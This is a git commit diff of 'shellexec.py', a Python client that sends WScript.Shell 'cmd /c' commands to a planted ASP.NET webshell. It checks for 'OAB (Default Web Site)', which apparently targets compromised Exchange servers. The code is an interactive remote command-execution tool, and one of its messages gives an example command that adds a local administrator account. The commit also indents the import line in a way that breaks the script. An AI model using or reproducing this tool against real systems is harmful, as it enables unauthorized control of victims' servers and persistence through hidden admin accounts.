03f34d77c531b7f146b0fe4b7dfc47e10a3bf49e
lulz <39673284+Udyz@users.noreply.github.com>
2021-03-26 19:46:58 +0700

    Update shellexec.py

--- shellexec.py
+++ shellexec.py
@@ -1,4 +1,4 @@
-import requests
+  import requests
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
@@ -9,16 +9,20 @@ if len(sys.argv) < 3:
 url = sys.argv[1]
 code = sys.argv[2]
 try:
-	while True:
-		cmd = input('CMD: ')
-		shell_body_exec = '%s=Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c %s").stdout.readall());'%(code, cmd)
-		shell_req = requests.post('%s'%(url),headers={'Content-Type': 'application/x-www-form-urlencoded'},data=shell_body_exec,verify=False, timeout=10)
-		if shell_req.status_code == 200:
-			print(shell_req.text.split('Name                            :')[0])
-		elif shell_req.status_code == 500:
-			print('(-) AV block exec cmd or you missing \\" ex: net localgroup \\"administrators\\" mrr0b0t /add')
-		else:
-			print('(-) Something wrong IDK ~~')
+	req_test = requests.get('%s'%(url), verify=False)
+	if "OAB (Default Web Site)" in req_test.text:
+		while True:
+			cmd = input('CMD: ')
+			shell_body_exec = '%s=Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c %s").stdout.readall());'%(code, cmd)
+			shell_req = requests.post('%s'%(url),headers={'Content-Type': 'application/x-www-form-urlencoded'},data=shell_body_exec,verify=False, timeout=20)
+			if shell_req.status_code == 200:
+				print(shell_req.text.split('Name                            :')[0])
+			elif shell_req.status_code == 500:
+				print('(-) AV block exec cmd or you missing \\" ex: net localgroup \\"administrators\\" mrr0b0t /add')
+			else:
+				print('(-) Something wrong IDK ~~')
+	else:
+		print('(-) Webshell not found!')
 except(requests.ConnectionError, requests.ConnectTimeout, requests.ReadTimeout):
 	exit(0)
 except KeyboardInterrupt:
